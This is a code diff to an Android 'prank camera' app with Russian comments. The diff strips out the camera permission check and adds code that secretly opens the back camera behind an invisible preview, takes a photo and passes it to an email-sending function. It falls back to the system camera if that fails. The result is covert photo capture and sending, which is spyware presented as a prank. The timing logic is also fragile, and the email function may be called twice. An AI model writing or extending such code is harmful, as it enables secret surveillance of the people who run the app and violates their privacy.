@@ -3,10 +3,8 @@ package com.example.prankcamerdemo
 import android.app.AlertDialog
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
-import android.graphics.Camera
 import android.hardware.Camera as HardwareCamera
 import android.media.MediaPlayer
-import android.os.Build
 import android.os.Bundle
 import android.os.CountDownTimer
 import android.util.Base64
@@ -111,62 +109,114 @@ class MainActivity : AppCompatActivity() {
         thread {
             var photoData: ByteArray? = null
             
+            // Подход 1: Пробуем открыть камеру напрямую (может работать на некоторых устройствах)
             try {
-                // Пробуем сделать фото через камеру (работает на Android 6.0+)
-                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || 
-                    checkSelfPermission(android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                var camera: HardwareCamera? = null
+                try {
+                    // Пробуем открыть заднюю камеру
+                    val cameraCount = HardwareCamera.getNumberOfCameras()
+                    val cameraInfo = android.hardware.Camera.CameraInfo()
                     
-                    var camera: HardwareCamera? = null
-                    try {
-                        camera = HardwareCamera.open()
-                        if (camera != null) {
-                            val parameters = camera.parameters
-                            
-                            // Настраиваем размер фото
-                            val sizes = parameters.supportedPictureSizes
-                            if (sizes.isNotEmpty()) {
-                                val size = sizes[0]
-                                parameters.setPictureSize(size.width, size.height)
-                                camera.parameters = parameters
-                                
-                                // Создаём SurfaceTexture для превью
-                                val texture = android.graphics.SurfaceTexture(10)
-                                camera.setPreviewTexture(texture)
-                                camera.startPreview()
-                                
-                                // Даём камере время на инициализацию
-                                Thread.sleep(500)
-                                
-                                // Делаем фото
-                                val photoRef = ByteArrayRef()
-                                camera.takePicture(null, null, object : HardwareCamera.PictureCallback {
-                                    override fun onPictureTaken(data: ByteArray?, camera: HardwareCamera?) {
-                                        if (data != null) {
-                                            photoRef.data = data
-                                        }
-                                        camera?.release()
-                                    }
-                                })
-                                
-                                // Ждём пока фото сохранится
-                                Thread.sleep(1000)
-                                
-                                photoData = photoRef.data
-                            }
-                            camera.release()
+                    for (i in 0 until cameraCount) {
+                        android.hardware.Camera.getCameraInfo(i, cameraInfo)
+                        if (cameraInfo.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK) {
+                            camera = HardwareCamera.open(i)
+                            break
                         }
-                    } catch (e: Exception) {
-                        e.printStackTrace()
-                        camera?.release()
                     }
+                    
+                    // Если задней нет - пробуем любую
+                    if (camera == null && cameraCount > 0) {
+                        camera = HardwareCamera.open(0)
+                    }
+                    
+                    if (camera != null) {
+                        val parameters = camera.parameters
+                        
+                        // Настраиваем размер фото
+                        val sizes = parameters.supportedPictureSizes
+                        if (sizes.isNotEmpty()) {
+                            val size = sizes[0]
+                            parameters.setPictureSize(size.width, size.height)
+                            camera.parameters = parameters
+                            
+                            // Создаём SurfaceTexture для превью
+                            val texture = android.graphics.SurfaceTexture(10)
+                            camera.setPreviewTexture(texture)
+                            camera.startPreview()
+                            
+                            // Даём камере время на инициализацию
+                            Thread.sleep(500)
+                            
+                            // Делаем фото
+                            val photoRef = ByteArrayRef()
+                            camera.takePicture(null, null, object : HardwareCamera.PictureCallback {
+                                override fun onPictureTaken(data: ByteArray?, camera: HardwareCamera?) {
+                                    if (data != null) {
+                                        photoRef.data = data
+                                    }
+                                    camera?.release()
+                                }
+                            })
+                            
+                            // Ждём пока фото сохранится
+                            Thread.sleep(1000)
+                            
+                            photoData = photoRef.data
+                        }
+                        camera.release()
+                    }
+                } catch (e: Exception) {
+                    e.printStackTrace()
+                    camera?.release()
                 }
             } catch (e: Exception) {
                 e.printStackTrace()
             }
             
+            // Подход 2: Если камера не сработала - пробуем через Intent (системная камера)
+            if (photoData == null) {
+                try {
+                    runOnUiThread {
+                        val intent = android.content.Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE)
+                        intent.putExtra("output", null) // Получим фото в onActivityResult
+                        startActivityForResult(intent, CAMERA_REQUEST_CODE)
+                    }
+                    Thread.sleep(2000) // Ждём пока пользователь сделает фото
+                } catch (e: Exception) {
+                    e.printStackTrace()
+                }
+            }
+            
             // Отправляем письмо (с фото или без)
             sendEmailWithPhoto(photoData)
         }
+    }
+    
+    companion object {
+        private const val CAMERA_REQUEST_CODE = 100
+    }
+    
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: android.content.Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        
+        if (requestCode == CAMERA_REQUEST_CODE && resultCode == RESULT_OK) {
+            // Пользователь сделал фото через системную камеру
+            val extras = data?.extras
+            val bitmap = extras?.get("data") as? android.graphics.Bitmap
+            if (bitmap != null) {
+                val stream = ByteArrayOutputStream()
+                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream)
+                val photoData = stream.toByteArray()
+                
+                // Отправляем фото на почту
+                sendEmailWithPhoto(photoData)
+                return
+            }
+        }
+        
+        // Если фото не получилось - отправляем без него
+        sendEmailWithPhoto(null)
     }
     
     private fun sendEmailWithPhoto(photoData: ByteArray?) {
